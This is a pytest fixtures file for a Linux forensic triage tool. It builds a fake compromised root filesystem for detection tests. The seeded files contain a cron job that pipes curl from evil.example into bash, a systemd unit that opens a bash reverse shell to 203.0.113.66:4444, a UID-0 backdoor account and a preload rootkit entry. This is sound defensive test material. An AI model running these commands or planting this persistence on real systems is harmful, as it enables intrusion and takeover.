"""Shared fixtures.

The centrepiece is :func:`compromised_image`: a synthetic, self-contained Linux
root tree seeded with a dozen textbook indicators of compromise. It needs no
root privileges and touches nothing outside ``tmp_path`` — Ammit collects it in
*image* mode exactly as it would a mounted disk image. ``collected_case`` runs a
real collection over it so triage tests work end-to-end.
"""

from __future__ import annotations

import base64
import os
from pathlib import Path

import pytest

from ammit.collect import build_context, run_collection

# A valid base64 blob so the authorized_keys parser computes a real fingerprint.
_KEY_BLOB = base64.b64encode(b"fake-ed25519-public-key-blob-for-tests-0001").decode()
_ATTACKER_IP = "203.0.113.66"


def _w(root: Path, rel: str, data: str | bytes, *, mode: int | None = None) -> Path:
    """Write a file (creating parents) under ``root`` at target path ``rel``."""
    path = root / rel.lstrip("/")
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, bytes):
        path.write_bytes(data)
    else:
        path.write_text(data, encoding="utf-8")
    if mode is not None:
        path.chmod(mode)
    return path


def _seed_proc(root: Path) -> None:
    """A fake /proc with a benign init and a miner running a deleted binary."""
    # pid 1 — benign.
    _w(root, "/proc/1/status", "Name:\tsystemd\nState:\tS (sleeping)\nPPid:\t0\nUid:\t0\t0\t0\t0\n")
    _w(root, "/proc/1/cmdline", b"/sbin/init\x00")
    os.symlink("/usr/lib/systemd/systemd", root / "proc/1/exe")

    # pid 31337 — xmrig executing an image unlinked from disk.
    _w(
        root,
        "/proc/31337/status",
        "Name:\txmrig\nState:\tR (running)\nPPid:\t1\nUid:\t0\t0\t0\t0\nGid:\t0\t0\t0\t0\n",
    )
    _w(root, "/proc/31337/cmdline", b"xmrig\x00-o\x00pool.minexmr.com:4444\x00--donate=0\x00")
    os.symlink("/dev/shm/.hidden/xmrig (deleted)", root / "proc/31337/exe")
    (root / "proc/31337/fd").mkdir(parents=True)
    os.symlink("socket:[44444]", root / "proc/31337/fd/3")

    # /proc/net/tcp — a bind shell listening on 4444 (0x115C), inode 44444.
    header = (
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
        "retrnsmt   uid  timeout inode\n"
    )
    line = (
        "   0: 00000000:115C 00000000:0000 0A 00000000:00000000 00:00000000 "
        "00000000  1000        0 44444 1 0000000000000000 100 0 0 10 0\n"
    )
    _w(root, "/proc/net/tcp", header + line)
    _w(root, "/proc/modules", "nf_tables 274432 0 - Live 0x0000000000000000\n")


def _seed_auth_log(root: Path) -> None:
    lines = [
        f"Jun 24 03:11:{i:02d} victim sshd[{1000 + i}]: "
        f"Failed password for invalid user admin from {_ATTACKER_IP} port {40000 + i} ssh2"
        for i in range(10)
    ]
    # Off-hours success from the same brute-forcing host…
    lines.append(
        f"Jun 24 03:14:02 victim sshd[1200]: "
        f"Accepted password for backdoor from {_ATTACKER_IP} port 5050 ssh2"
    )
    # …and a benign daytime login that must NOT trip the off-hours rule.
    lines.append(
        "Jun 24 14:02:11 victim sshd[1300]: "
        "Accepted publickey for gustavo from 198.51.100.10 port 6000 ssh2"
    )
    _w(root, "/var/log/auth.log", "\n".join(lines) + "\n")


def build_compromised_root(root: Path) -> Path:
    """Populate ``root`` with a synthetic compromised system."""
    _w(root, "/etc/hostname", "victim01\n")

    # Accounts: a backdoor UID-0 account and an SSH key on a nologin service user.
    _w(
        root,
        "/etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "backdoor:x:0:0:pwned:/root:/bin/bash\n"
        "gustavo:x:1000:1000:Gustavo:/home/gustavo:/bin/bash\n",
    )
    _w(root, "/etc/group", "root:x:0:\nwww-data:x:33:\ngustavo:x:1000:\n")
    _w(root, "/var/www/.ssh/authorized_keys", f"ssh-ed25519 {_KEY_BLOB} attacker@evil\n")

    # Persistence: ld.so.preload rootkit, malicious cron and a reverse-shell unit.
    _w(root, "/etc/ld.so.preload", "/lib/x86_64-linux-gnu/libprocesshider.so\n")
    _w(
        root,
        "/etc/cron.d/evil",
        "# auto-generated\nPATH=/usr/bin:/bin\n"
        "*/5 * * * * root curl -fsSL http://evil.example/x.sh | bash\n",
    )
    _w(
        root,
        "/etc/systemd/system/backdoor.service",
        "[Unit]\nDescription=System Cache Helper\n\n"
        "[Service]\nType=simple\n"
        'ExecStart=/bin/bash -c "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"\n'
        "Restart=always\n\n"
        "[Install]\nWantedBy=multi-user.target\n",
    )

    # Filesystem: a SUID shell in /tmp and a hidden staging dir in /dev/shm.
    _w(root, "/tmp/.cache/rootbash", b"\x7fELF fake suid shell\n", mode=0o4755)
    _w(root, "/dev/shm/.hidden/xmrig", b"\x7fELF fake miner\n", mode=0o755)

    # Anti-forensics: root's shell history redirected to the void.
    (root / "root").mkdir(exist_ok=True)
    os.symlink("/dev/null", root / "root/.bash_history")

    _seed_auth_log(root)
    _seed_proc(root)
    return root


def build_clean_root(root: Path) -> Path:
    """A minimal, unremarkable system that should weigh out CLEAN."""
    _w(root, "/etc/hostname", "workstation\n")
    _w(
        root,
        "/etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\ngustavo:x:1000:1000:Gustavo:/home/gustavo:/bin/bash\n",
    )
    _w(root, "/etc/group", "root:x:0:\ngustavo:x:1000:\n")
    _w(root, "/home/gustavo/.bash_history", "ls\nwhoami\nvim notes.md\n")
    _w(root, "/proc/1/status", "Name:\tsystemd\nState:\tS (sleeping)\nPPid:\t0\nUid:\t0\t0\t0\t0\n")
    os.symlink("/usr/lib/systemd/systemd", root / "proc/1/exe")
    return root


def _collect(root: Path, out: Path):
    ctx = build_context(root, authorized=False)
    return run_collection(ctx, out, label="test")


@pytest.fixture(scope="session")
def compromised_image(tmp_path_factory: pytest.TempPathFactory) -> Path:
    return build_compromised_root(tmp_path_factory.mktemp("compromised"))


@pytest.fixture(scope="session")
def collected_case(compromised_image: Path, tmp_path_factory: pytest.TempPathFactory) -> Path:
    case = _collect(compromised_image, tmp_path_factory.mktemp("cases"))
    return case.path


@pytest.fixture(scope="session")
def clean_case(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = build_clean_root(tmp_path_factory.mktemp("clean"))
    case = _collect(root, tmp_path_factory.mktemp("clean_cases"))
    return case.path
